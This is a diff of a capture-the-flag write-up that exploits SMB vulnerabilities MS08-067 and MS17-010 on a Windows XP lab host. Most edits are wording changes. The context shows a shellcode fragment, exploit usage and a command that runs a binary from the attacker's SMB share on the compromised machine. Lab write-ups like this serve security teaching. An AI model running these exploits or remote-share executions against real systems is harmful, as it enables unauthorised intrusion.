@@ -57,7 +57,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 59.95 seconds
 ```
 
-Looking at the output of `masscan` we discovered SMB ports `139 & 445` are open and operating system running on the host is `Windows XP`.
+Looking at the output of `masscan`& `nmap` we discovered SMB ports `139 & 445` are open and operating system running on the host is `Windows XP`.
 
 ### Nmap SMB script
 
@@ -110,7 +110,7 @@ Nmap done: 1 IP address (1 host up) scanned in 9.47 seconds
 
 We discovered the host is vulnerable to notorious SMB exploits `MS08-67 (exploited widely by Conficker worm)` and `MS17-010 (by Shadow Brokers)`.
 
-We'll exploit both vulnerabilities **MS08-67** & **MS17-010** manually sticking to OSCP pattern using publicly available exploit scripts.
+Let's exploit both vulnerabilities **MS08-67** & **MS17-010** manually sticking to OSCP pattern using publicly available exploit scripts.
 
 ## MS08-67
 
@@ -160,9 +160,9 @@ unsigned char buf[] =
 "\x92\xb3\x5a";
 ```
 
-We can replace the default shellcode given in the script with above one generated for my IP and port.
+We will replace the default shellcode given in the script with above one generated.
 
-Looking at the usage of this exploit on line 228 we can see the exploit requires us to know the OS version and Language pack:
+Looking at the usage of this exploit on line 228, we can see the exploit requires us to know the OS version and Language pack:
 
 ```console
       print '\nUsage: %s <target ip> <os #> <Port #>\n' % sys.argv[0]
@@ -242,7 +242,7 @@ type root.txt
 
 The fact that we could grab both the flag indicates that we are running as `NT AUTHORITY\SYSTEM`, but how do we confirm whether we are running as system since Windows XP doesn't have `whoami` binary.
 
-We can host `whoami.exe` which is by default available on kali OS inside `/usr/share/windows-binaries` on our SMB server using `Impacket's Smbserver` and run the binary on the remote host:
+We can use `whoami.exe` which is by default available on kali OS inside `/usr/share/windows-binaries` and host it on our SMB server using `Impacket's Smbserver` and run it on the remote host:
 
 ### Sharing SMB folder from attacking machine
 
@@ -355,8 +355,8 @@ NT AUTHORITY\SYSTEM
 
 ## Metasploit
 
-We can easily own the box using Metasploit, since it has built in exploits for both vulnerabilities.
-Lets run Metasploit using `msfconsole` and use `exploit/windows/smb/ms08_067_netapi`. Set the payload, other parameters and fire up the exploit.
+We can easily own the box using Metasploit, since it has built in exploits for both the vulnerabilities.
+Lets run Metasploit using `msfconsole` and use `exploit/windows/smb/ms08_067_netapi`. We'll then set the payload, other parameters and fire up the exploit.
 
 Similar to above two methods, we can verify if we running as system using our `whoami.exe` binary.
 
@@ -411,6 +411,6 @@ C:\WINDOWS\system32>\\10.10.14.14\cfx\whoami.exe
 \\10.10.14.14\cfx\whoami.exe
 NT AUTHORITY\SYSTEM
 ```
-We pwned the Box !
+And we pwned the Box !
 
 Thanks for reading, Feedback is appreciated !
